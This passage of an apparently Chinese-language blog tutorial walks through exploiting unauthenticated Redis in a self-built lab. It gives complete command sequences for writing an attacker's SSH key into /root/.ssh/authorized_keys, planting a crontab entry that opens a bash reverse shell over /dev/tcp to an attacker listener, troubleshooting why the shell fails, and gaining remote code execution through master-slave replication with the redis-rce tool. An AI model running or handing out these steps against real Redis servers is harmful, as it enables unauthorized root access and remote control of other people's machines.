-<h4 id="利用前提：-1"><a href="#利用前提：-1" class="headerlink" title="利用前提："></a>利用前提：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.当redis以root身份运行。</span><br><span class="line"></span><br><span class="line">2.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</span><br><span class="line"></span><br><span class="line">3.存在/root/.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录不过可能进不去root目录权限问题可能或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</span><br></pre></td></tr></table></figure>
-
-<h4 id="开始复现：-1"><a href="#开始复现：-1" class="headerlink" title="开始复现："></a>开始复现：</h4><p>首先要有自己的ssh配套的公钥和私钥</p>
-<p>windows下使用git来生成自己的ssh公钥与私钥，在桌面点击右键选择git bash here，执行如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/%E4%BD%BF%E7%94%A8git%E7%94%9F%E6%88%90ssh.png"></p>
-<p>在用户名文件夹下的.ssh文件夹里</p>
-<p><img src="/redis/%E5%85%AC%E9%92%A5%E7%94%9F%E6%88%90.png"></p>
-<p>生成密钥之后我们可以将公钥id_rsa.pub里面内容复制粘贴到key.txt文件中，再上传到靶机上面，使用如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">type key.txt | redis-cli.exe -h 192.168.10.129 -x set xxx#如果是linux 将type换成cat</span><br><span class="line">#将公钥作为value插入到数据库中，key随便啥值。</span><br><span class="line">redis-cli.exe -h 192.168.10.129 config set dir /root/.ssh</span><br><span class="line">#修改redis数据库路径</span><br><span class="line">redis-cli.exe -h 192.168.10.129 config set dbfilename authorized_keys</span><br><span class="line">#生成缓冲文件authorized_keys</span><br><span class="line">redis-cli.exe -h 192.168.10.129 save</span><br><span class="line">#保存</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/redis%E7%9A%84ssh%E5%AF%86%E9%92%A5%E8%BF%9E%E6%8E%A5.png"></p>
-<p>通过命令cd ~&#x2F;.ssh来进入.ssh文件夹下(一定要先成为超级用户，否则会进入失败)</p>
-<p><img src="/redis/%E9%AA%8C%E8%AF%81.ssh%E5%85%AC%E9%92%A5%E6%98%AF%E5%90%A6%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.png"></p>
-<p>可以看到已经上传成功了，接下来在攻击机上的.ssh文件夹的终端下执行如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.129</span><br><span class="line">#连接</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/ssh%E7%A7%81%E9%92%A5%E8%BF%9E%E6%8E%A5.png"></p>
-<p>在这里输入你自己生成的私钥即可</p>
-<p><strong>注意：</strong></p>
-<p><strong>1.如果你是linux系统使用cat,是windows系统使用type.</strong></p>
-<p><strong>2.如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x34;&#x33;&#46;&#49;&#52;&#49;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x34;&#x33;&#46;&#49;&#52;&#49;</a>需要在.ssh目录下，因为权限问题。</strong></p>
-<p><strong>3.你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。</strong></p>
-<p><strong>4.文件名必须是authorized_keys,由配置文件决定的。</strong></p>
-<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="什么是crontab"><a href="#什么是crontab" class="headerlink" title="什么是crontab"></a>什么是crontab</h4><p>crontab 是一个在类 Unix 系统中定时执行任务的命令，它允许用户在指定的时间点或时间间隔内运行命令或脚本。通常情况下，crontab 命令用于自动化重复性任务，如备份、数据同步、清理日志等。</p>
-<p>用户可以通过 crontab 命令编辑和管理 crontab 文件，其中包含了需要定时执行的任务的详细信息，如执行命令、执行时间、执行频率等等。crontab 文件通常存储在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下，每个用户都有一个对应的 crontab 文件。</p>
-<p>crontab 命令有很多选项和语法规则，它可以帮助用户创建和管理自己的 crontab 文件。例如，您可以使用 crontab -e命令来编辑您的 crontab 文件，使用 crontab -l命令来列出当前用户的 crontab 文件中的所有任务，使用 crontab -r 命令来删除当前用户的 crontab 文件。还可以使用 man crontab命令来查看 crontab 的详细说明和使用说明。</p>
-<p>总之，crontab 是一个非常强大和常用的类 Unix 系统工具，它能够帮助用户自动化重复性任务，提高工作效率和系统稳定性。</p>
-<h4 id="windows下下载ncat命令"><a href="#windows下下载ncat命令" class="headerlink" title="windows下下载ncat命令"></a>windows下下载ncat命令</h4><p><a href="https://nmap.org/ncat/">这是下载ncat(也就是linux下nc)命令的网址</a></p>
-<p>下载好之后将文件路径添加到PATH路径下面，以便可以在任何路径下使用，配置好后假设监听8888端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
-
-<p>出现如下页面就表示监听成功：</p>
-<p><img src="/redis/windows%E4%B8%8B%E4%BD%BF%E7%94%A8nc.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/在windows下使用ipconfig查到的域名/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/redis%E5%BC%B9shell.png"></p>
-<p>![](redis&#x2F;kali 检测是否上传反弹文件成功.png)</p>
-<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>可能我们上面的工作都做好了之后会发现依旧没有给我们弹shell</p>
-<p><strong>第一个</strong>：首先你要看一下你的cron启动没有，可以先查看状态如果是running,那就不用管，如果不是就需要启动一下，一般而言cron都是自启动的。所以一般来说不会是这个出问题。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">service crond restart#重启</span><br><span class="line">service crond start#启动</span><br><span class="line">service crond stop#关闭</span><br><span class="line">service crond status#查看状态</span><br></pre></td></tr></table></figure>
-
-<p>上面的命令不是一定的，有的环境下crond服务叫cron，可以用以下命令检测自己的cron服务叫什么名字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files | grep cron</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二个</strong>：我发现我的cron启动了但是依然无法反弹shell,去找了资料知道利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。我们手动删除乱码发现反弹仍然失败，查看资料发现我们还需要关注以下问题。</p>
-<p><strong>第三个</strong>:root文件的权限必须为600也就是说是rw———–，执行如下命令进行排查和更改</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l</span><br><span class="line">chmod 600 root </span><br></pre></td></tr></table></figure>
-
-<p><strong>第四个</strong>:我们反弹shell的&#x2F;bin&#x2F;sh是bash，而我的靶机的bin&#x2F;sh是dash ,所以运行出错。我们需要通过以下命令查看和修改。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /bin/sh#查看运行环境</span><br><span class="line">ln -s -f bash /bin/sh#修改为bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/%E4%BF%AE%E6%94%B9%E5%8F%8D%E5%BC%B9%E7%9A%84%E8%B7%AF%E5%BE%84.png"></p>
-<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h4 id="了解什么是主从复制"><a href="#了解什么是主从复制" class="headerlink" title="了解什么是主从复制"></a>了解什么是主从复制</h4><p>edis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。这个大家自己找一些资料了解一下。</p>
-<h4 id="主从复制反弹shell"><a href="#主从复制反弹shell" class="headerlink" title="主从复制反弹shell"></a>主从复制反弹shell</h4><p>如果要是的利用成功需要先下载攻击代码，步骤已经给到大家。不过linux来git clone可能会失败，所以这里的步骤是在windows上下载好之后直接将文件拖进linux，这里还有注意如果利用redis主从复制redis版本要是4.x或者5.x</p>
-<p>靶机：kali 192.168.10.129</p>
-<p>攻击机 windows 192.168.10.1</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git</span><br><span class="line">    #下载RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce</span><br><span class="line">    #下载redis-rce</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%87.png"></p>
-<p>就会在相应文件夹下生成两个文件夹<br><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%872.png"></p>
-<p>将这两个文件夹拖入linux下，并进入RedisModules-ExecuteCommand目录，执行如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%873.png"></p>
-<p>编译之后执行如下名令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv module.so /home/yyb167111/桌面/redis-rce  #就是redis-rce所在路径</span><br></pre></td></tr></table></figure>
-
-<p>执行之后，就将redis-rce拖入windows下，也就是复制，然后进入到redis-rce文件夹目录下，执行cmd进入终端，然后执行如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.129 -L 192.168.10.1 -f module.so</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%BC%B9shell.png"></p>
-<p>可以看到一些参数，-r指的是靶机IP -L指的是攻击机IP，如果没有指定端口就会使用默认端口。</p>
-<p>运行以下命令，会让你选择，可以输入i,r,e分别对应交互式shell,反弹shell和退出吧。</p>
-<p>如果反弹shell就需要监听端口</p>
-<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8D%E5%BC%B9shell2.png"></p>
-<p>注意：如果redis需要密码，可以加-a参数。</p>
 ]]></content>
   </entry>
 </search>
